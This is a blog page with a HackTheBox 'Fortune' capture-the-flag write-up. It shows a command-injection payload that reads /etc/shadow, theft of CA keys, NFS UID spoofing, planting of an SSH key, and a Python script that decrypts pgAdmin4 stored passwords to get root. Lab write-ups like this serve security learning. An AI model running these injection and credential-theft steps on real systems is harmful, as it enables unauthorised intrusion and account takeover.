<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>HackTheBox - WriteUp 11 &middot; Pat~ Pat~ Meow~</title>
  <meta name="description" content="HackTheBox 练手" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-123948588-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

  <style>
    body {
      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
    }
  </style>
</head>
  <body class="single-body">
    <nav class="nav-bar side-padding">
  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
  <div class="hamburger-menu">
    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
      <span></span>
      <span></span>
    </button>
    <ul id="menu" class="hamburger-menu-overlay">
      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
    </ul>
  </div>
</nav>
    <main class="content side-text-padding">
      <article class="post ">
        <header class="post-header">
        	<h1 class="post-title">HackTheBox - WriteUp 11</h1>
          <p class="post-date">Posted <time datetime="2019-07-05">Jul 5, 2019</time></p>
        </header>
        
        <picture class="post-figure">
            
            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
        </picture>
        
        

<h1 id="fortune">Fortune</h1>

<h2 id="user">User</h2>

<p>Nmap it: 22,80,443.</p>

<p>Then, Access 80. Burpsuite, try to submit the form, found a POST at <code>/select</code> with <code>db=blahblah</code>, This param included RCE, modify the request like this: <code>db=blah;cat /etc/shadow</code>, you&rsquo;ll get the response.</p>

<p>Found a user called <code>charlie</code>, <code>bob</code>, <code>nfsuser</code>. Then use the RCE we just found to read two files:</p>

<ul>
<li>/home/bob/ca/intermediate/private/intermediate.key.pem</li>
<li>/home/bob/ca/intermediate/certs/intermediate.cert.pem</li>
</ul>

<p>Then use this to create a cert: <code>openssl pkcs12 -inkey intermediate.key.pem -in intermediate.cert.pem -export -out inter_pfx.pfx</code>, and then import this certificate to your browser.</p>

<blockquote>
<p><a href="https://www.openbsd.org/faq/pf/authpf.html">https://www.openbsd.org/faq/pf/authpf.html</a></p>
</blockquote>

<p>Finally, access the 443 port and get the RSA keys of SSH, then login as <code>nasuser</code> with the key you&rsquo;ve just get. Keep the connection alive to let you continue your operation.</p>

<p>Nmap again, you&rsquo;ll find the NFS port is opened. Then <code>apt install nfs-common -y</code>, enum the nfs share with <code>nmap -oN fortune.nfsshowmount.nmap --script=nfs-showmount 10.10.10.127</code>, you&rsquo;ll get home shared. Mount the NFS using <code>mount.nfs 10.10.10.127:/home /mnt/nfs1</code>. NFS has a UID mapping. So create a user with UID 1000, access <code>/mnt/nfs1/charlie</code>, then you have the <code>user.txt</code>.</p>

<h2 id="root">Root</h2>

<p>After that, write the public key you&rsquo;ve just got to the <code>/mnt/nfs1/charlie/.ssh/authorized_keys</code>, then the home folder contains a file called <code>mbox</code>, this is a mail archive telling you that dba password is the same as the root.</p>

<p>Check the process list, you will find postgresql and <code>pgadmin4</code>. Check <code>/var/appsrv/pgadmin4</code>, there is a <code>PGAdmin4 V3.4</code> here, but installed on <code>/usr/local/pgadmin4/pgadmin4-3.4/</code>, check the folder, from the <code>&lt;PGADMIN4&gt;/web/utils/crypto.py</code>, you will find how to decrypt the hash we will got.</p>

<p>Then, at <code>/var/appsrv/pgadmin4/pgadmin4.db</code>, use <code>select * from server;</code>, the hash you&rsquo;ve found is the hashed key of dba, and this hash is encrypted using AES-128-CFB, ciphertext is encoded in base64 with IV attached.</p>

<p>The encrypt password is the logged-in user&rsquo;s password, use <code>select * from user;</code>, just use the bob&rsquo;s hashed password as the encryption password, and decrypt. Decryptor Script as below:</p>

<pre><code class="language-python">#!/usr/bin/env python3

import base64
import hashlib

from Crypto import Random
from Crypto.Cipher import AES

padding_string = b'}'

def pad(key):
    &quot;&quot;&quot;Add padding to the key.&quot;&quot;&quot;

    global padding_string
    str_len = len(key)

    # Key must be maximum 32 bytes long, so take first 32 bytes
    if str_len &gt; 32:
        return key[:32]

    # If key size id 16, 24 or 32 bytes then padding not require
    if str_len == 16 or str_len == 24 or str_len == 32:
        return key

    # Convert bytes to string (python3)
    if not hasattr(str, 'decode'):
        padding_string = padding_string.decode()

    # Add padding to make key 32 bytes long
    return key + ((32 - str_len % 32) * padding_string)

    
def decrypt(ciphertext, key):
    &quot;&quot;&quot;
    Decrypt the AES encrypted string.
    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    &quot;&quot;&quot;

    global padding_string

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    decrypted = cipher.decrypt(ciphertext[AES.block_size:])

    return decrypted
    

cept = &quot;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&quot;.encode()
key4aes = &quot;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg&quot;.encode()
print(decrypt(cept,key4aes).decode())
</code></pre>

<p>The decrypted password is: <code>R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!</code></p>

<p>Then <code>su root</code> and do anything you want.</p>

<p>(END)</p>

      </article>
      <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </main>
    <nav class="end-nav side-padding">
      
      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup10/" class="card blog-card" rel="bookmark" >
    
    <div class="card-img-container">
      <p class="card-img-overlay">Next Article</p>
      <picture>
        
        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
      </picture>
    </div>
    
  <article class="card-body">
    <h2 class="card-title">HackTheBox - WriteUp 10</h2>
    <p class="card-text">HackTheBox 练手</p>
    <div class="card-subtext muted-text">
      <p>Posted <time datetime="2019-07-04 74:00">Jul 4, 2019</time></p>
      <p>#tech </p>
    </div>
  </article>
</a>
      
      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
  Home
</a>
    </nav>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
    onload="renderMathInElement(document.body);"></script>
<script src="https://www.kmahyyg.xyz/js/core.js"></script>
<script>
  hljs.initHighlightingOnLoad();
</script>
  </body>
</html>